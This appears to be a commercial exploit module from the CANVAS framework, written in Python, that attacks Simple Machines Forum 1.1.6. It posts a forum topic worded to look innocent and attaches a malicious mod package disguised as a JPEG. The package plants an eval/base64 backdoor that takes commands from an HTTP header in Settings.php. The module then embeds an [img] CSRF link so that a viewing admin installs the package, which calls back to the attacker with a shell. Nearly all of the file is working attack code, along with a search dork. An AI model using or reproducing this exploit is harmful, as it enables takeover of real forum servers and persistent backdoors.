#! /usr/bin/env python

# Proprietary CANVAS source code - use only under the license agreement
# specified in LICENSE.txt in your CANVAS distribution
# Copyright Immunity, Inc, 2002-2009
# http://www.immunityinc.com/CANVAS/ for more information
#

import sys
if "." not in sys.path: sys.path.append(".")

from exploitutils import *
from ExploitTypes.php_multi import *

import canvasengine
import StringIO
import re
import tarfile
import gzip
import hashlib


NAME="Simple Machines Forum => 1.1.6 CSRF Remote Code Execution"
DESCRIPTION="Simple Machines Forum => 1.1.6 CSRF Remote Code Execution"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Simplemachines.org"
DOCUMENTATION["Repeatability"]="Infinite"
DOCUMENTATION["CVE Name"]="None"
DOCUMENTATION['CVE Url']="No CVE entry for this, check: http://osvdb.org/show/osvdb/50071"
DOCUMENTATION["References"]=["None"]
DOCUMENTATION["DORK"]=["Powered by SMF"]
DOCUMENTATION["NOTES"]="""
To use this exploit properly from the gui be sure to set a call back before
using the exploit. Being we have to wait on an admin to view a post it wont 
pop a shell right after running so you need to wait. 

Clean up:
remove these lines from Settings.php
eval(base64_decode("TEMPLINE"));
if(isset($_SERVER['HTTP_CMD'])) { eval(base64_decode($_SERVER['HTTP_CMD']));exit();
"""

VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Web Exploits"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Linux" ] , ["Windows"] ]
PROPERTY['VERSION'] = [ "All" ]

CHANGELOG="""
"""

class theexploit(php_multi):
    def __init__(self):
        php_multi.__init__(self)
        self.port=80
        self.host=""
        self.ssl=""
        self.basepath="/"
        self.basepaths=["/smf116/","/forums/","/board/","/forum/","/"]
        self.command=None 
        self.basicauth_user=""
        self.basicauth_password=""
        self.user=""
        self.password=""
        self.hostname=None
        self.foundstrings=["Powered by SMF"]
        self.testfile="index.php"
        self.sid="" 
        self.seq="" 
        self.seq2=""
        self.bid="" 
        self.pid="" 
        self.aid=""
        self.subject="Will somebody help me?" # Subject that sounds legitimate. 
        self.message="I am having trouble viewing ttsdfhe forum." # Topic body that doesnt look suspicious.
    
        return 


    def request1(self):
        """
	SMF login function never changes
	Possible to make an smf exploit class maybe?
	"""
        self.log("[*] Logging In")

        data={}
        data["user"]=self.user

        self.log("[*] User: %s Password: %s"%(self.user, self.password))

        if self.version==1:
            self.log("[*] Using password (and blank hash_passwrd)")
            data["passwrd"]=self.password
            data["hash_passwrd"]=""	    
        else:
            self.log("[*] Using hash password")
            data["passwrd"]=""

        data["cookielength"]="-1"
        data=self.UA.POST("index.php?action=login2",data=data)	    
        data=self.UA.GET("index.php?action=profile")

        if data.count("The user whose profile you are trying to view does not exist"):
            self.log("[*] Wrong Username/Password")
            return 0
        else:
            self.log("[*] Logged in Succeeded")

        return True

    def request2(self):
        """
	Get Session variables
	"""
        data=self.UA.GET('index.php?action=post;board=%s.0'%(self.bid))

        #get Session ID
        p=re.compile('name="sc" value="([0-9a-f]+)')
        match=p.search(data)
        if not match:
            self.log("[*] No session ID detected!")
            return 0
        self.sid=match.group()[-32:]
        self.log("[*] Sid found: %s"%self.sid)

        #Get seqnum 
        p=re.compile('name="seqnum" value="([0-9]+)')
        match=p.search(data)
        if not match:
            self.log("[*] Error getting ID")
            return 0
        self.seq=match.group()[-7:]
        self.log("[*] seqnum: %s"%self.seq)

        return (self.sid,self.seq)


    def maketar(self):
        """
	lets do our package generation
	"""

        command=self.get_php_to_mosdef()
        self.log("[*] Command: %s"%command)			
        command=b64encode(command)

        install = """<?xml version="1.0"?>
                <!DOCTYPE modification SYSTEM "http://www.simplemachines.org/xml/modification">
                <modification xmlns="http://www.simplemachines.org/xml/modification" xmlns:smf="http://www.simplemachines.org/">
                <!-- This information needs to be the same as that in the package-info.xml. -->
                <id>babjusi:banned_members_avatar</id>
                <version>0.1</version>

                <file name="Settings.php">
                <operation>
                <search position="end" />
                <add><![CDATA[
                eval(base64_decode("TEMPLINE"));
                if(isset($_SERVER['HTTP_CMD'])) { eval(base64_decode($_SERVER['HTTP_CMD']));exit(); }]]></add>
                </operation>
                </file>
                </modification>
                """.replace("TEMPLINE",command)

        package_info = """<?xml version="1.0"?>
                     <!DOCTYPE package-info SYSTEM "http://www.simplemachines.org/xml/package-info">
                     <package-info xmlns="http://www.simplemachines.org/xml/package-info" xmlns:smf="http://www.simplemachines.org/">
                     <name>Banned members avatar</name>
                     <id>babjusi:banned_members_avatar</id>
                     <type>modification</type>
                     <version>0.1</version>
                     <install>
                     <modification>install.xml</modification>
                     </install>
                     </package-info>
                     """

        """
	Try this a dirty way first then without writing to disk
	"""

        installfile = open('install.xml','w')
        installfile.write(install)
        installfile.close()	

        packagefile = open('package-info.xml','w')
        packagefile.write(package_info)
        packagefile.close()

        tar = tarfile.open("blah.tar", "w")
        tar.add('install.xml')
        tar.add('package-info.xml')
        tar.close()

        f_in = open('blah.tar', 'rb')
        f_out = gzip.open('blah.tar.gz', 'wb')
        f_out.writelines(f_in)
        f_out.close()
        f_in.close()

        pack = open('blah.tar.gz','rb')
        buf  = pack.read()

        dbg  = "".join( map(lambda x: "\\x%02x" % ord(x), buf) )
        self.log("[*] TAR DATA:\n%s"%dbg)
        return buf

    def request3(self):
        """
	Post a topic
	"""

        fields={}
        fields["subject"]=self.subject
        fields["message"]=self.message
        fields["sc"]=self.sid
        fields["seqnum"]=self.seq
        fields["icon"]="xx"
        fields["topic"]="0"
        fields["notify"]="0"
        fields["lock"]="0"
        fields["sticky"]="0"
        fields["move"]="0"
        fields["additional_options"]="1"
        fields["post"]="Post"

        self.tar = self.maketar()

        files=[("attachment[]", "jpeg.jpg", self.tar)]
        data=self.UA.multipart("index.php?action=post2;start=0;board=%s"%(self.bid), fields, files)

        topic=self.UA.GET('index.php?board=%s.0'%(self.bid))
        p=re.compile("topic=([0-9]+)")
        match=p.search(topic)
        if not match:
            self.log("[*] Error getting Topic")
            return 0
        self.pid=match.group().split("=")[1]
        self.log("[*] Topic: %s"%self.pid)

        return self.pid

    def request4(self):
        """
	Edit our post
	"""
        ret = ""

        # Do MD5 Hash Calculation 
        m      = hashlib.md5()
        n      = 'jpeg.jpg'
        m.update(n)	
        md5sum = m.hexdigest()	
        self.log("[*] MD5: %s"%md5sum)

        attach=self.UA.GET('index.php?topic=%s.0'%(self.pid))
        p=re.compile('attach=([0-9]+)')
        match=p.search(attach)
        if not match:
            self.log("[*] Error getting Attach ID")
            return 0
        self.aid=match.group().split("=")[1]
        self.log("[*] Attach ID: %s"%self.aid)

        package = "../attachments/"+self.aid+"_jpeg_jpg"+md5sum
        self.log("[*] Crafted Attachment: %s"%package)
        csrf    = "http://"+self.host+self.basepath+"index.php?%61ction=packages&amp;sa=install2&amp;package="+package
        self.log("[*] Crafted CSRF Request: %s"%csrf)

        data=self.UA.GET('index.php?action=post;board=%s.0'%(self.bid))

        # updated seqnum 
        p=re.compile('name="seqnum" value="([0-9]+)')
        match=p.search(data)
        if not match:
            self.log("[*] Error getting ID")
            return 0
        self.seq=match.group()[-7:]
        self.log("[*] Updated seqnum: %s"%self.seq)

        img = "[img]"+csrf+"[/img]"

        fields={}
        fields["topic"]=self.pid
        fields["subject"]=self.subject
        fields["icon"]="xx"
        fields["message"]=self.message+img
        fields["notify"]="0"
        fields["lock"]="0"
        fields["goback"]="1"
        fields["sticky"]="0"
        fields["move"]="0"
        fields["attach_del[]"]="0"
        fields["attach_del[]"]=self.aid
        fields["post"]="Save"
        fields["num_replies"]="0"
        fields["additional_options"]="0"
        fields["sc"]=self.sid
        fields["seqnum"]=self.seq

        data=self.UA.POST("index.php?action=post2;start=0;msg=%s;sesc=%s;board=%s"%(self.pid,self.sid,self.bid),fields)
        self.log("[*] Done. now we wait for an admin to view our post and get a call back.")
        return ret

    def usage(self):
        print "Example: "+sys.argv[0]+" -t 172.16.104.128 -p 80 -O user:temp -O password:password -l 10.10.10.227 -d 9898"
        print "-t <target ip>"
        print "-p <target port>                [optional]"
        print "-O basepath: /path/to/smf/      [optional]"
        print "-O hostname: target vhost       [optional]"
        print "-O command:commandtorun         [optional]"
        print "-O user: forum username"
        print "-O password: forum password"
        print "-O bid: board id to post on"
        print "-l call back ip if doing connect back"
        print "-d listening port for call back"
        return

if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
